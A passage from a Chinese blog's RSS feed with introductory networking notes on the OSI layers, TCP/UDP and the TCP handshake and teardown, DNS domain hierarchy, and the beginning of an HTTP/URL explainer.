&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171622222.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171622222&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;第一层-物理层&#34;&gt;第一层 物理层
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171648102.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171648102&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;此层是最容易掌握的层之一。简单地说，此层引用网络中使用的硬件的物理组件，是您将找到的最低层。设备使用电信号在二进制编号系统（1 和 0）中相互传输数据。&lt;/p&gt;
&lt;p&gt;例如，连接设备的以太网电缆，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171656569.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171656569&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;第二层-数据链路层&#34;&gt;第二层 数据链路层
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171741696.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171741696&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;数据链路层侧重于传输的物理寻址。它从网络层接收数据包（包括远程计算机的 IP 地址），并添加接收端点的物理 &lt;strong&gt;MAC&lt;/strong&gt;（媒体访问控制）地址。每台支持网络的计算机内部都有一个 &lt;strong&gt;N&lt;/strong&gt;etwork &lt;strong&gt;I&lt;/strong&gt;nterface Card （&lt;strong&gt;NIC），&lt;/strong&gt; 它带有一个唯一的 MAC 地址来识别它。&lt;/p&gt;
&lt;p&gt;MAC 地址由制造商设置并实际烧录到卡中;它们无法更改 - 尽管它们可以被欺骗。当信息通过网络发送时，它实际上是用于标识信息的确切发送位置的物理地址。&lt;/p&gt;
&lt;p&gt;此外，数据链路层的工作还包括以适合传输的格式呈现数据。&lt;/p&gt;
&lt;h3 id=&#34;第三层-网络层&#34;&gt;第三层 网络层
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171800098.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171800098&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;OSI 模型的第三层（网络层）是路由和重新组装数据的魔力发生的地方（从这些小块到更大的块）。首先，路由只是确定这些数据块应发送到的最佳路径。&lt;/p&gt;
&lt;p&gt;虽然这一层的一些协议准确地确定了数据到达设备的 “最佳” 路径，但我们只能在网络模块的这个阶段知道它们的存在。简而言之，这些协议包括 &lt;strong&gt;OSPF&lt;/strong&gt; （&lt;strong&gt;O&lt;/strong&gt;pen &lt;strong&gt;S hortest&lt;/strong&gt; &lt;strong&gt;P&lt;/strong&gt;ath &lt;strong&gt;F&lt;/strong&gt;irst） 和 &lt;strong&gt;RIP&lt;/strong&gt; （&lt;strong&gt;R&lt;/strong&gt;outing &lt;strong&gt;I&lt;/strong&gt;nformation &lt;strong&gt;P&lt;/strong&gt;rotocol）。决定采用哪种路线的因素由以下因素决定：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;哪条路最短？即，数据包需要传输的设备数量最少。&lt;/li&gt;
&lt;li&gt;什么路径最可靠？即，数据包之前是否在该路径上丢失过？&lt;/li&gt;
&lt;li&gt;哪条路径的物理连接速度更快？即，一条路径是使用铜缆连接（较慢）还是光纤（相当快）？&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在这一层，一切都通过 IP 地址处理，例如 192.168.1.100。能够使用 IP 地址传输数据包的设备（例如路由器）称为第 3 层设备，因为它们能够在 OSI 模型的第三层工作。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171814647.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171814647&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;第四层--传输层&#34;&gt;第四层  传输层
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171831749.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171831749&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;OSI 模型的第 4 层在通过网络传输数据方面起着至关重要的作用，可能有点难以掌握。在设备之间发送数据时，它遵循两种不同的协议之一，这些协议是根据几个因素决定的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TCP 协议&lt;/li&gt;
&lt;li&gt;UDP 协议&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;让我们从 TCP 开始。&lt;strong&gt;T&lt;/strong&gt;ransmission &lt;strong&gt;C&lt;/strong&gt;ontrol &lt;strong&gt;P&lt;/strong&gt;rotocol （&lt;strong&gt;TCP）。&lt;/strong&gt; 顾名思义，该协议在设计时考虑了可靠性和保证。此协议在两个设备之间保留一个持续连接，用于发送和接收数据所需的时间。&lt;/p&gt;
&lt;p&gt;不仅如此，TCP 还将错误检查纳入其设计中。错误检查是 TCP 如何保证从会话层（第 5 层）中的小块发送的数据随后以相同的顺序接收和重组。&lt;/p&gt;
&lt;p&gt;让我们在下表中总结 TCP 的优缺点：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;**TCP 的优点 **&lt;/th&gt;
          &lt;th&gt;**TCP 的缺点 **&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;保证数据的准确性。&lt;/td&gt;
          &lt;td&gt;需要在两个设备之间建立可靠的连接。如果未收到一小块数据，则无法使用整个数据块。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;能够同步两个设备，以防止彼此被数据淹没。&lt;/td&gt;
          &lt;td&gt;慢速连接可能会给另一台设备带来瓶颈，因为连接将始终在接收计算机上保留。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;执行更多的过程以实现可靠性。&lt;/td&gt;
          &lt;td&gt;TCP 比 UDP 慢得多，因为使用此协议的设备必须完成更多工作。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;TCP 用于文件共享、Internet 浏览或发送电子邮件等情况。这种用法是因为这些服务要求数据准确和完整（拥有半个文件不好！&lt;/p&gt;
&lt;p&gt;在下图中，我们可以看到猫的图片是如何从 “webserver” 分解成小块数据（称为数据包）的，其中 “computer” 将猫的图片重新构建为正确的顺序。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171930198.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171930198&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;现在让我们进入 &lt;strong&gt;U&lt;/strong&gt;ser &lt;strong&gt;D&lt;/strong&gt;atagram &lt;strong&gt;P&lt;/strong&gt;rotocol（或简称 &lt;strong&gt;U&lt;strong&gt;&lt;strong&gt;D&lt;/strong&gt;&lt;/strong&gt;P&lt;/strong&gt;）。该协议不如它的兄弟 TCP 协议先进。它没有 TCP 提供的许多功能，例如错误检查和可靠性。事实上，通过 UDP 发送的任何数据都会发送到计算机，无论它是否到达那里。两个设备之间没有同步或保证;只是希望最好，手指交叉。&lt;/p&gt;
&lt;p&gt;虽然这听起来很不利，但它确实有其优点，我们将在下表中进行布局：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;UDP 的优势&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;UDP 的缺点&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;UDP 比 TCP 快得多。&lt;/td&gt;
          &lt;td&gt;UDP 不关心是否收到数据。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;UDP 让应用程序层（用户软件）决定是否可以控制数据包的发送速度。&lt;/td&gt;
          &lt;td&gt;从这个意义上说，它对软件开发人员来说是相当灵活的。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;UDP 不会像 TCP 那样在设备上保留连续连接。&lt;/td&gt;
          &lt;td&gt;这意味着不稳定的连接会给用户带来糟糕的体验。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;使用与之前相同的示例，我们现在可以看到“计算机”只接收了数据包 #1 和 #3，这意味着缺少一半的图像。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171943902.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171943902&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;UDP 在发送小块数据的情况下非常有用。&lt;/p&gt;
&lt;h4 id=&#34;tcp三次握手四次挥手&#34;&gt;TCP三次握手四次挥手
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;三次握手与四次挥手&lt;/strong&gt;是TCP协议中用于建立和终止连接的关键机制，确保数据传输的可靠性。以下是详细解释：&lt;/p&gt;
&lt;hr&gt;
&lt;h5 id=&#34;一三次握手建立连接&#34;&gt;&lt;strong&gt;一、三次握手（建立连接）&lt;/strong&gt;
&lt;/h5&gt;&lt;p&gt;&lt;strong&gt;目的&lt;/strong&gt;：确保客户端与服务器双方具备收发数据的能力。
&lt;strong&gt;过程&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;SYN（客户端 → 服务器）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;客户端发送SYN报文（SYN=1，seq=x），进入&lt;code&gt;SYN_SENT&lt;/code&gt;状态。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：请求建立连接，并初始化序列号。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SYN-ACK（服务器 → 客户端）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;服务器回应SYN-ACK报文（SYN=1，ACK=1，ack=x+1，seq=y），进入&lt;code&gt;SYN_RCVD&lt;/code&gt;状态。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：确认收到请求，同时发送自身序列号。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ACK（客户端 → 服务器）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;客户端发送ACK报文（ACK=1，ack=y+1，seq=x+1），双方进入&lt;code&gt;ESTABLISHED&lt;/code&gt;状态。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：确认服务器的响应，完成连接建立。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;为什么需要三次？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;防止已失效的请求报文突然传到服务器（如网络延迟导致重复SYN），避免资源浪费。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h5 id=&#34;二四次挥手终止连接&#34;&gt;&lt;strong&gt;二、四次挥手（终止连接）&lt;/strong&gt;
&lt;/h5&gt;&lt;p&gt;&lt;strong&gt;目的&lt;/strong&gt;：确保双方数据收发完毕后再安全关闭连接。
&lt;strong&gt;过程&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;FIN（主动关闭方 → 被动关闭方）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;主动方（如客户端）发送FIN报文（FIN=1，seq=u），进入&lt;code&gt;FIN_WAIT_1&lt;/code&gt;状态。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：表示不再发送数据，但可接收数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ACK（被动关闭方 → 主动关闭方）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;被动方回应ACK报文（ACK=1，ack=u+1，seq=v），进入&lt;code&gt;CLOSE_WAIT&lt;/code&gt;状态。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：确认收到关闭请求，但可能继续发送未完成的数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;FIN（被动关闭方 → 主动关闭方）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;被动方发送FIN报文（FIN=1，ACK=1，ack=u+1，seq=w），进入&lt;code&gt;LAST_ACK&lt;/code&gt;状态。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：表示自身数据已发送完毕，请求关闭连接。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ACK（主动关闭方 → 被动关闭方）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;主动方回应ACK报文（ACK=1，ack=w+1，seq=u+1），进入&lt;code&gt;TIME_WAIT&lt;/code&gt;状态（等待2MSL时间）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;：确认最终关闭，防止最后一个ACK丢失导致被动方重传FIN。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;为什么需要四次？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TCP是全双工通信，双方需独立关闭发送通道。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;三三次握手建立连接确保双方能正常通话&#34;&gt;&lt;strong&gt;三、三次握手：建立连接（确保双方能正常通话）&lt;/strong&gt;
&lt;/h5&gt;&lt;h6 id=&#34;场景小明想约小美商量聚会计划&#34;&gt;&lt;strong&gt;场景&lt;/strong&gt;：小明想约小美商量聚会计划。
&lt;/h6&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;第一次握手（SYN）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;小明打电话给小美：“&lt;strong&gt;小美，你能听到我说话吗？&lt;/strong&gt;”（发送 SYN 包）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;状态&lt;/strong&gt;：小明等待回应（&lt;code&gt;SYN_SENT&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第二次握手（SYN-ACK）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;小美接听电话：“&lt;strong&gt;小明，我能听到！你能听到我吗？&lt;/strong&gt;”（回复 SYN-ACK 包）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;状态&lt;/strong&gt;：小美等待小明确认（&lt;code&gt;SYN_RCVD&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第三次握手（ACK）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;小明回应：“&lt;strong&gt;我能听到！&lt;/strong&gt;”（发送 ACK 包）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;状态&lt;/strong&gt;：双方正式通话（&lt;code&gt;ESTABLISHED&lt;/code&gt;），开始讨论聚会细节（数据传输）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;为什么需要三次？&lt;/strong&gt;
如果小明喊完第一句后，小美没回应，小明会重拨（避免网络延迟导致重复连接）。三次确认确保双方 ​&lt;strong&gt;​“听得到”且“能回应”​&lt;/strong&gt;。&lt;/p&gt;
&lt;hr&gt;
&lt;h5 id=&#34;四四次挥手断开连接确保双方说完所有话&#34;&gt;&lt;strong&gt;四、四次挥手：断开连接（确保双方说完所有话）&lt;/strong&gt;
&lt;/h5&gt;&lt;h6 id=&#34;场景讨论结束两人要挂电话&#34;&gt;&lt;strong&gt;场景&lt;/strong&gt;：讨论结束，两人要挂电话。
&lt;/h6&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;第一次挥手（FIN）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;小明说：“&lt;strong&gt;我要说的都说完了，挂了吧！&lt;/strong&gt;”（发送 FIN 包）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;状态&lt;/strong&gt;：小明等待小美确认（&lt;code&gt;FIN_WAIT_1&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第二次挥手（ACK）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;小美回应：“&lt;strong&gt;好的，我知道你说完了。&lt;/strong&gt;”（回复 ACK 包）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;状态&lt;/strong&gt;：小美可能还有话要说（&lt;code&gt;CLOSE_WAIT&lt;/code&gt;），小明等待小美结束（&lt;code&gt;FIN_WAIT_2&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第三次挥手（FIN）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;小美补充：“&lt;strong&gt;我也说完了，挂了吧！&lt;/strong&gt;”（发送 FIN 包）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;状态&lt;/strong&gt;：小美等待小明确认（&lt;code&gt;LAST_ACK&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第四次挥手（ACK）&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;小明最后回应：“&lt;strong&gt;好的，再见！&lt;/strong&gt;”（发送 ACK 包）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;状态&lt;/strong&gt;：小明等待片刻（&lt;code&gt;TIME_WAIT&lt;/code&gt;，防止小美没收到确认），双方挂断（&lt;code&gt;CLOSED&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;为什么需要四次？&lt;/strong&gt;
因为两人要 ​&lt;strong&gt;各自确认“我说完了”且“你也说完了”​&lt;/strong&gt;。小明先结束发言权，小美可能还有补充，最后双方才真正挂断。&lt;/p&gt;
&lt;hr&gt;
&lt;h5 id=&#34;五总结&#34;&gt;&lt;strong&gt;五、总结&lt;/strong&gt;
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;三次握手&lt;/strong&gt;：像打电话时的三次确认（“听得到吗？”→“听得到！你呢？”→“我也听得到！”）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;四次挥手&lt;/strong&gt;：像挂电话时的四次告别（“我说完了”→“好”→“我也说完了”→“好，再见！”）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;技术映射&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;SYN&lt;/strong&gt;：发起通话请求（“你能听到吗？”）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ACK&lt;/strong&gt;：确认收到消息（“好的”）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;FIN&lt;/strong&gt;：结束发言（“我挂了啊”）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;第五层-会话层&#34;&gt;第五层 会话层
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320172010792.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320172010792&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;一旦数据从表示层（第 6 层）正确转换或格式化，会话层（第 5 层）将开始创建和维护与数据目标的其他计算机的连接。建立连接后，将创建一个会话。当此连接处于活动状态时，会话也处于活动状态。&lt;/p&gt;
&lt;p&gt;会话层还负责关闭连接（如果连接有一段时间未使用或丢失）。此外，会话&lt;em&gt;可以&lt;/em&gt;包含“检查点”，如果数据丢失，则只需要发送最新的数据，从而节省带宽。&lt;/p&gt;
&lt;p&gt;值得注意的是，会话是唯一的，这意味着数据不能在不同的会话之间传输，而实际上只能在每个会话之间传输。&lt;/p&gt;
&lt;h3 id=&#34;第六层-表示层&#34;&gt;第六层 表示层
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320172044624.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320172044624&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;OSI 模型的第 6 层是开始进行标准化的层。由于软件开发人员可以以不同的方式开发任何软件，例如电子邮件客户端，因此无论软件如何工作，数据仍然需要以相同的方式处理。&lt;/p&gt;
&lt;p&gt;该层充当数据进出应用程序层（第 7 层）的转换器。接收计算机还将理解以一种格式发送到计算机的数据，这些数据以另一种格式发送给计算机。例如，当您发送电子邮件时，其他用户可能有其他电子邮件客户端发送给您，但电子邮件的内容仍需要显示相同的内容。&lt;/p&gt;
&lt;p&gt;数据加密（如访问安全站点时的 HTTPS）等安全功能位于此层。&lt;/p&gt;
&lt;h3 id=&#34;第七层-应用层&#34;&gt;第七层 应用层
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320172103033.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320172103033&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;SI 模型的应用层是您最熟悉的层。之所以如此熟悉，是因为应用程序层是协议和规则所在的层，用于确定用户应如何与发送或接收的数据进行交互。&lt;/p&gt;
&lt;p&gt;日常应用程序（如电子邮件客户端、浏览器或文件服务器浏览软件（如 FileZilla）为用户提供了一个友好的 &lt;strong&gt;G&lt;/strong&gt; &lt;strong&gt;实时用户界面&lt;/strong&gt; （&lt;strong&gt;GUI），&lt;/strong&gt; 以便与发送或接收的数据进行交互。其他协议包括 &lt;strong&gt;DNS&lt;/strong&gt; （&lt;strong&gt;D&lt;/strong&gt;omain &lt;strong&gt;N&lt;/strong&gt;ame &lt;strong&gt;S&lt;/strong&gt;ystem），这是网站地址转换为 IP 地址的方式。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320172114887.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320172114887&#34;
	
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>DNS 详细信息</title>
        <link>https://Yerucrem.github.io/p/dns-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/dns-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background07.jpg" alt="Featured image of post DNS 详细信息" /&gt;&lt;h1 id=&#34;dns详细信息&#34;&gt;DNS详细信息
&lt;/h1&gt;&lt;p&gt;DNS（域名系统）为我们提供了一种与 Internet 上的设备进行通信的简单方法，而无需记住复数。就像每栋房子都有一个直接向其发送邮件的唯一地址一样，互联网上的每台计算机都有自己唯一的地址来与之通信，称为 IP 地址。IP 地址类似于以下 104.26.10.229,4 组数字，范围从 0 到 255，用句点分隔。当您想访问一个网站时，记住这组复杂的数字并不十分方便，而这正是 DNS 可以提供帮助的地方。因此，您可以记住 &lt;a class=&#34;link&#34; href=&#34;http://tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;tryhackme.com&lt;/a&gt;，而不是记住 104.26.10.229。&lt;/p&gt;
&lt;h2 id=&#34;域层次结构&#34;&gt;域层次结构
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319084618758.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;tld-顶级域名&#34;&gt;TLD （顶级域名）
&lt;/h3&gt;&lt;p&gt;TLD 是域名最右侧的部分。因此，例如，&lt;a class=&#34;link&#34; href=&#34;http://tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;tryhackme.com&lt;/a&gt; TLD 是 &lt;strong&gt;.com&lt;/strong&gt;。TLD 有两种类型，gTLD（通用顶级域名）和 ccTLD（国家代码顶级域名）。从历史上看，gTLD 旨在告诉用户域名的用途;例如，.com 用于商业目的，.org 用于组织，.edu 用于教育，.gov 用于政府。ccTLD 用于地理目的，例如 .ca 表示位于加拿大的站点，.co.uk 表示位于英国的站点，依此类推。由于这种需求，涌入了从 .online 、 .club 、 .website 、 .biz 等 新 gTLD 。&lt;/p&gt;
&lt;h3 id=&#34;二级域&#34;&gt;二级域
&lt;/h3&gt;&lt;p&gt;以 &lt;a class=&#34;link&#34; href=&#34;http://tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;tryhackme.com&lt;/a&gt; 为例，.com部分是 TLD，tryhackme 是二级域名。注册域名时，二级域名限制为 63 个字符 + TLD，并且只能使用 a-z 0-9 和连字符（不能以连字符开头或结尾或有连续的连字符）。&lt;/p&gt;
&lt;h3 id=&#34;子域&#34;&gt;子域
&lt;/h3&gt;&lt;p&gt;子域位于二级域的左侧，使用句点分隔它;例如，在 name &lt;a class=&#34;link&#34; href=&#34;http://admin.tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;admin.tryhackme.com&lt;/a&gt; 中，admin 部分是 subdomain。子域名的创建限制与二级域名相同，限制为 63 个字符，并且只能使用 a-z 0-9 和连字符（不能以连字符开头或结尾，也不能有连续的连字符）。您可以使用多个子域（用句点拆分）来创建更长的名称，例如 &lt;a class=&#34;link&#34; href=&#34;http://jupiter.servers.tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;jupiter.servers.tryhackme.com&lt;/a&gt;。但长度必须保持在 253 个字符或更少。您可以为域名创建的子域数量没有限制。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HTTP 详细信息</title>
        <link>https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/9e73050aede3552bc3b00fe7cfe1120f427c37f01e08ad760bbdfa9abc939b1c.png" alt="Featured image of post HTTP 详细信息" /&gt;&lt;h1 id=&#34;http协议&#34;&gt;HTTP协议
&lt;/h1&gt;&lt;h2 id=&#34;什么是-http超文本传输协议&#34;&gt;什么是 HTTP？（超文本传输协议）
&lt;/h2&gt;&lt;p&gt;HTTP 是您查看网站时使用的工具，由 Tim Berners-Lee 和他的团队在 1989 年至 1991 年间开发。HTTP 是用于与 Web 服务器通信以传输网页数据（无论是 HTML、图像、视频等）的规则集。&lt;/p&gt;
&lt;h2 id=&#34;什么是-https-安全超文本传输协议&#34;&gt;什么是 HTTPS？ （安全超文本传输协议）
&lt;/h2&gt;&lt;p&gt;HTTPS 是 HTTP 的安全版本。 HTTPS 数据是加密的，因此它不仅可以阻止人们看到您接收和发送的数据，还可以确保您正在与正确的 Web 服务器通信，而不是冒充它。&lt;/p&gt;
&lt;h2 id=&#34;什么是-url统一资源定位器&#34;&gt;什么是 URL？（统一资源定位器）
&lt;/h2&gt;&lt;p&gt;如果您曾经使用过 Internet，那么您以前也使用过 URL。URL 主要是有关如何访问 Internet 上的资源的指令。下图显示了 URL 及其所有功能的外观（它不会在每个请求中使用所有功能）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319090006894.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Scheme&lt;/strong&gt;:这指示使用什么协议来访问资源，例如 HTTP、HTTPS、FTP（文件传输协议）。&lt;/li&gt;
&lt;li&gt;**User:**某些服务需要身份验证才能登录，您可以在 URL 中输入用户名和密码才能登录。&lt;/li&gt;
&lt;li&gt;**Host:**您要访问的服务器的域名或 IP 地址。&lt;/li&gt;
&lt;li&gt;**Port:**您要连接的端口，通常为 80 用于 HTTP，443 用于 HTTPS，但这可以托管在 1 - 65535 之间的任何端口上。&lt;/li&gt;
&lt;li&gt;**Path:**您尝试访问的资源的文件名或位置。&lt;/li&gt;
